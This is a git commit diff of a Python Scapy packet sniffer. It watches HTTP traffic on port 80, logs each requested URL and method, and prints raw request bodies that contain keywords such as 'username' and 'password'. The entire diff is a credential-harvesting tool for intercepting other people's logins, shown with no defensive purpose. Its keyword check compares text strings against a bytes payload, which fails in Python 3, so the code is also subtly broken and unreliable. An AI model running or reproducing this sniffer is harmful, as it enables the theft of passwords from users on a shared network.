cb26e4f35962405ccd44e7596b82221cb6c38911
WMDA <p3dh0001@gmail.com>
2020-07-17 13:52:34 +0100

    updated

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,6 +1,7 @@
 import scapy.all as scapy
-from scapy.layers import http
+from scapy.layers.http import HTTPRequest
 import argparse
+import sys
 
 def options():
     parse = argparse.ArgumentParser()
@@ -13,11 +14,25 @@ def options():
 
 
 def sniffer(interface):
-    scapy.sniff(iface=interface, store=False, prn=processer)
+    scapy.sniff(filter='port 80',iface=interface, store=False, prn=processer)
 
 def processer(packet):
-    if packet.haslayer(http.HTTPRequest):
-        print(packet)
-        
+    if packet.haslayer(HTTPRequest):
+        url=packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        #ip = packet[IP].src.decode()
+        method = packet[HTTPRequest].Method.decode()
+        print(f">>{url} with {method}")
+        if packet.haslayer(scapy.Raw):
+            load= packet[scapy.Raw].load
+            keys= ['username','user','login','password','pass']
+            for key in keys:
+                if key in load:
+                    print(load)
+                    break
+
 options=options()
-sniffer(options.interface)
+try:
+    sniffer(options.interface)
+except KeyboardInterrupt:
+    print('User requested termination.\nHASTA LA VISTA......')
+    sys.exit()
